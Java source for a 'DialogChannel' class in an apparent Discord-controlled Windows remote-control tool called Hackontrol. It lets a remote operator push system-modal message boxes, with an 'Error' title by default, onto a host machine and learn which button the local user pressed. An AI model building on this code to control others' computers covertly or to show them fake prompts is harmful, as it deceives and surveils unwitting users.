package com.khopan.hackontrol.channel;

import java.util.List;
import java.util.function.Consumer;

import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.NativeLibrary;
import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.manager.interaction.InteractionManager;
import com.khopan.hackontrol.manager.interaction.ModalContext;
import com.khopan.hackontrol.manager.interaction.ModalManager;
import com.khopan.hackontrol.manager.interaction.StringSelectContext;
import com.khopan.hackontrol.manager.interaction.StringSelectManager;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;
import com.khopan.hackontrol.win32.WinUser;

import net.dv8tion.jda.api.interactions.callbacks.IModalCallback;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.selections.StringSelectMenu;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;

public class DialogChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "dialog";

	private static Button BUTTON_NEW_DIALOG = ButtonManager.staticButton(ButtonType.SUCCESS, "New Dialog", "newDialog");

	@Override
	public String getName() {
		return DialogChannel.CHANNEL_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(InteractionManager.BUTTON_REGISTRY, DialogChannel.BUTTON_NEW_DIALOG, context -> this.replyDialogModal(context, false, null));
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(DialogChannel.BUTTON_NEW_DIALOG)).queue();
	}

	private void replyDialogModal(IModalCallback callback, boolean edit, DialogInstance instance) {
		TextInput.Builder titleInput   = TextInput.create("title",   "Title",   TextInputStyle.SHORT).setMinLength(-1).setMaxLength(-1).setRequired(false).setPlaceholder("Error");
		TextInput.Builder messageInput = TextInput.create("message", "Message", TextInputStyle.PARAGRAPH).setMinLength(-1).setMaxLength(-1).setRequired(false).setPlaceholder("Type a message...");

		if(instance != null) {
			if(instance.title != null && !instance.title.isBlank()) {
				titleInput.setValue(instance.title);
			}

			if(instance.message != null && !instance.message.isBlank()) {
				messageInput.setValue(instance.message);
			}
		}

		callback.replyModal(ModalManager.dynamicModal(edit ? "Edit Dialog" : "New Dialog", context -> {
			if(!edit) {
				this.modalNewDialog(context);
				return;
			}

			instance.title = context.getValue("title").getAsString();
			instance.message = context.getValue("message").getAsString();
			context.editMessage(instance.toString()).queue();
		}).addActionRow(titleInput.build()).addActionRow(messageInput.build()).build()).queue();
	}

	private void modalNewDialog(ModalContext context) {
		DialogInstance instance = new DialogInstance();
		instance.title = context.getValue("title").getAsString();
		instance.message = context.getValue("message").getAsString();
		instance.icon = DialogIcon.ICON_INFORMATION;
		instance.optionType = DialogOptionType.OPTION_OK;
		StringSelectMenu iconMenu = StringSelectManager.dynamicMenu(Event -> this.storeDefault(Event, DialogIcon.class, icon -> instance.icon = icon))
				.addOption("Icon Information", DialogIcon.ICON_INFORMATION.name(), "An icon consisting of a lowercase letter i in a circle appears in the message box.")
				.addOption("Icon Question",    DialogIcon.ICON_QUESTION.name(),    "A question-mark icon appears in the message box.")
				.addOption("Icon Warning",     DialogIcon.ICON_WARNING.name(),     "An exclamation-point icon appears in the message box.")
				.addOption("Icon Error",       DialogIcon.ICON_ERROR.name(),       "A stop-sign icon appears in the message box.")
				.setMaxValues(1)
				.setDefaultValues(instance.icon.name())
				.build();

		StringSelectMenu optionMenu = StringSelectManager.dynamicMenu(Event -> this.storeDefault(Event, DialogOptionType.class, optionType -> instance.optionType = optionType))
				.addOption("Abort, Retry, Ignore",        DialogOptionType.OPTION_ABORT_RETRY_IGNORE.name(),       "The message box contains three push buttons: Abort, Retry, and Ignore.")
				.addOption("Cancel, Try Again, Continue", DialogOptionType.OPTION_CANCEL_TRYAGAIN_CONTINUE.name(), "The message box contains three push buttons: Cancel, Try Again, Continue.")
				.addOption("Ok",                          DialogOptionType.OPTION_OK.name(),                       "The message box contains one push button: OK.")
				.addOption("Ok, Cancel",                  DialogOptionType.OPTION_OK_CANCEL.name(),                "The message box contains two push buttons: OK and Cancel.")
				.addOption("Retry, Cancel",               DialogOptionType.OPTION_RETRY_CANCEL.name(),             "The message box contains two push buttons: Retry and Cancel.")
				.addOption("Yes, No",                     DialogOptionType.OPTION_YES_NO.name(),                   "The message box contains two push buttons: Yes and No.")
				.addOption("Yes, No, Cancel",             DialogOptionType.OPTION_YES_NO_CANCEL.name(),            "The message box contains three push buttons: Yes, No, and Cancel.")
				.setMaxValues(1)
				.setDefaultValues(instance.optionType.name())
				.build();

		context.reply(instance.toString()).addActionRow(iconMenu).addActionRow(optionMenu).addActionRow(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Display", Event -> this.buttonDisplay(Event, instance)), ButtonManager.dynamicButton(ButtonType.SUCCESS, "Edit", Event -> this.replyDialogModal(Event, true, instance)), HackontrolButton.delete()).queue(InteractionManager :: callback);
	}

	private <T extends Enum<T>> void storeDefault(StringSelectContext context, Class<T> enumClass, Consumer<T> consumer) {
		List<String> values = context.getValues();
		StringSelectMenu menu = context.getSelectMenu().createCopy().setDefaultValues(values).build();
		context.editSelectMenu(menu).queue();

		if(!values.isEmpty()) {
			consumer.accept(Enum.valueOf(enumClass, values.get(0)));
		}
	}

	private void buttonDisplay(ButtonContext context, DialogInstance instance) {
		context.deferEdit().queue();
		String title = instance.title;
		String message = instance.message;
		int flags = WinUser.MB_DEFBUTTON1 | WinUser.MB_SYSTEMMODAL;

		if(instance.icon != null) {
			flags |= instance.icon.flag;
		}

		if(instance.optionType != null) {
			flags |= instance.optionType.flag;
		}

		int response = NativeLibrary.dialog(title, message, flags);
		String buttonName = switch(response) {
		case WinUser.IDOK       -> "Ok";
		case WinUser.IDCANCEL   -> "Cancel";
		case WinUser.IDABORT    -> "Abort";
		case WinUser.IDRETRY    -> "Retry";
		case WinUser.IDIGNORE   -> "Ignore";
		case WinUser.IDYES      -> "Yes";
		case WinUser.IDNO       -> "No";
		case WinUser.IDCONTINUE -> "Continue";
		case WinUser.IDTRYAGAIN -> "Try Again";
		default                 -> "Unknown " + response;
		};

		context.getChannel().sendMessage("**Button: " + buttonName + "**").addActionRow(HackontrolButton.delete()).queue();
	}

	private static class DialogInstance {
		private String title;
		private String message;
		private DialogIcon icon;
		private DialogOptionType optionType;

		@Override
		public String toString() {
			StringBuilder builder = new StringBuilder();

			if(this.title != null && !this.title.isEmpty()) {
				builder.append("**Title**\n");
				builder.append(this.title);
			}

			if(this.message != null && !this.message.isEmpty()) {
				builder.append("\n\n**Message**\n");
				builder.append(this.message);
			}

			return builder.toString().trim();
		}
	}

	private static enum DialogIcon {
		ICON_INFORMATION(WinUser.MB_ICONINFORMATION),
		ICON_QUESTION(WinUser.MB_ICONQUESTION),
		ICON_WARNING(WinUser.MB_ICONWARNING),
		ICON_ERROR(WinUser.MB_ICONERROR);

		private int flag;

		DialogIcon(int flag) {
			this.flag = flag;
		}
	}

	private static enum DialogOptionType {
		OPTION_ABORT_RETRY_IGNORE(WinUser.MB_ABORTRETRYIGNORE),
		OPTION_CANCEL_TRYAGAIN_CONTINUE(WinUser.MB_CANCELTRYCONTINUE),
		OPTION_OK(WinUser.MB_OK),
		OPTION_OK_CANCEL(WinUser.MB_OKCANCEL),
		OPTION_RETRY_CANCEL(WinUser.MB_RETRYCANCEL),
		OPTION_YES_NO(WinUser.MB_YESNO),
		OPTION_YES_NO_CANCEL(WinUser.MB_YESNOCANCEL);

		private int flag;

		DialogOptionType(int flag) {
			this.flag = flag;
		}
	}
}
